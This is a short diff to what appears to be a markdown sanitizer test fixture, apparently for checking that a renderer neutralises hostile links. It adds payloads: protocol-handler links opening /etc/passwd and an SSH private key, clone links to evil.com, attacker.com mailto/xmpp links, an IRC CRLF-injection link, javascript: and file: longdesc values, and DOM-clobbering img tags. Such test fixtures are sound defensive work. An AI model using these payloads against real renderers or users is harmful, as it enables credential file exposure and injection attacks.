@@ -1,4 +1,24 @@
-# DOM clobber
+[g1](github-mac://open?file=/etc/passwd)
+
+[g2](github-mac://open?file=../../.ssh/id_rsa)
+
+[g3](github-mac://open?file=file:///etc/passwd)
+
+[g4](github-mac://clone?url=https://evil.com/x.git)
+
+[g5](github-windows://open?file=/etc/passwd)
+
+[g6](github-windows://clone?url=https://evil.com/x.git)
+
+[g7](mailto:evil@attacker.com?subject=x&body=y)
+
+[g8](xmpp:evil@attacker.com?message;body=hi)
+
+[g9](irc://evil.com/%0D%0APRIVMSG)
+
+<img src="x" longdesc="javascript:alert(1)">
+
+<img src="x" longdesc="file:///etc/passwd"># DOM clobber
 <img name="attributes" src="x">
 <img name="querySelector" src="x">
 <img name="location" src="x">
